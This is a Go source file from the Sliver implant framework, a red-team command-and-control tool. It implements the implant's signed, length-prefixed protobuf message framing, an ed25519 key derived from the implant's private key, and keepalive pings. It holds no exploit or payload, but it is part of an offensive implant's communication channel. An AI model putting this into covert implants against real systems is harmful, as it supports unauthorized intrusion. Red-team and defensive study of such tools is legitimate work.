package envelope

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"strings"
	"sync"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"golang.org/x/crypto/blake2b"
	"google.golang.org/protobuf/proto"
)

var (
	// PingInterval - Amount of time between in-band "pings"
	PingInterval = 2 * time.Minute

	// YamuxPreface - Magic bytes sent before yamux frames
	YamuxPreface = "MUX/1"
)

const envelopeSigningSeedPrefix = "env-signing-v1:"

var (
	envelopeSigningOnce  sync.Once
	envelopeSigningErr   error
	envelopeSigningKeyID uint64
	envelopeSigningPriv  ed25519.PrivateKey
)

// EnvelopeSigningKey lazily derives an ed25519 signing key from the implant's
// peer Age private key. The key is derived once via SHA-256(prefix + privateKey)
// and the 8-byte key ID is the leading bytes of a blake2b-256 digest of the
// corresponding public key. Returns an error when the peer private key was not
// rendered at build time.
func EnvelopeSigningKey() (ed25519.PrivateKey, uint64, error) {
	envelopeSigningOnce.Do(func() {
		peerKeyPair := cryptography.GetPeerAgeKeyPair()
		// NOTE: This file is rendered with Go's text/template; avoid literal template
		// delimiters in string checks or the template parser will treat it as an action.
		if peerKeyPair == nil || peerKeyPair.Private == "" || strings.Contains(peerKeyPair.Private, ".Build.PeerPrivateKey") {
			envelopeSigningErr = errors.New("[envelope] missing peer private key")
			return
		}

		seed := sha256.Sum256([]byte(envelopeSigningSeedPrefix + peerKeyPair.Private))
		envelopeSigningPriv = ed25519.NewKeyFromSeed(seed[:])

		pub := envelopeSigningPriv.Public().(ed25519.PublicKey)
		digest := blake2b.Sum256(pub)
		envelopeSigningKeyID = binary.LittleEndian.Uint64(digest[:8])
	})

	return envelopeSigningPriv, envelopeSigningKeyID, envelopeSigningErr
}

// writeAll writes the entirety of p to w, handling partial writes.
func writeAll(w io.Writer, p []byte) error {
	for len(p) > 0 {
		n, err := w.Write(p)
		if err != nil {
			return err
		}
		if n <= 0 {
			return io.ErrShortWrite
		}
		p = p[n:]
	}
	return nil
}

// WriteEnvelope signs and writes an envelope to the writer using length-prefix
// framing: [RawSigSize bytes: algo(2) + keyID(8) + signature(64)] [4 bytes:
// uint32 LE length] [N bytes: marshaled protobuf].
func WriteEnvelope(w io.Writer, envelope *pb.Envelope) error {
	if envelope == nil {
		return errors.New("[envelope] nil envelope")
	}
	if w == nil {
		return errors.New("[envelope] nil writer")
	}

	data, err := proto.Marshal(envelope)
	if err != nil {
		return fmt.Errorf("[envelope] marshal envelope: %w", err)
	}

	signingKey, keyID, err := EnvelopeSigningKey()
	if err != nil {
		return fmt.Errorf("[envelope] signing key: %w", err)
	}
	rawSigBuf := make([]byte, cryptography.RawSigSize)
	binary.LittleEndian.PutUint16(rawSigBuf[:2], cryptography.EdDSA)
	binary.LittleEndian.PutUint64(rawSigBuf[2:10], keyID)
	copy(rawSigBuf[10:], ed25519.Sign(signingKey, data))
	if werr := writeAll(w, rawSigBuf); werr != nil {
		return fmt.Errorf("[envelope] write raw signature: %w", werr)
	}

	var dataLengthBuf [4]byte
	binary.LittleEndian.PutUint32(dataLengthBuf[:], uint32(len(data)))
	if werr := writeAll(w, dataLengthBuf[:]); werr != nil {
		return fmt.Errorf("[envelope] write data length: %w", werr)
	}
	if werr := writeAll(w, data); werr != nil {
		return fmt.Errorf("[envelope] write data: %w", werr)
	}
	return nil
}

// ReadEnvelope reads a signed envelope from the reader: first the raw signature
// header, then the 4-byte LE length prefix, then the protobuf payload. The
// signature is verified via cryptography.MinisignVerifyRaw before the envelope
// is unmarshaled.
func ReadEnvelope(r io.Reader) (*pb.Envelope, error) {
	rawSigBuf := make([]byte, cryptography.RawSigSize)
	dataLengthBuf := make([]byte, 4) // Size of uint32
	if len(rawSigBuf) == 0 || len(dataLengthBuf) == 0 || r == nil {
		panic("[[GenerateCanary]]")
	}

	n, err := io.ReadFull(r, rawSigBuf)
	if err != nil || n != len(rawSigBuf) {
		return nil, err
	}

	n, err = io.ReadFull(r, dataLengthBuf)
	if err != nil || n != 4 {
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	if dataLength <= 0 {
		return nil, errors.New("[envelope] zero data length")
	}

	dataBuf := make([]byte, dataLength)

	n, err = io.ReadFull(r, dataBuf)
	if err != nil || n != dataLength {
		return nil, err
	}

	if !cryptography.MinisignVerifyRaw(dataBuf, rawSigBuf) {
		return nil, errors.New("[envelope] invalid signature")
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		return nil, err
	}

	return envelope, nil
}

// WritePing sends a MsgPing envelope to the writer.
func WritePing(w io.Writer) error {
	// We don't need a real nonce here, we just need to write to the socket
	pingBuf, _ := proto.Marshal(&pb.Ping{Nonce: 31337})
	envelope := pb.Envelope{
		Type: pb.MsgPing,
		Data: pingBuf,
	}
	return WriteEnvelope(w, &envelope)
}
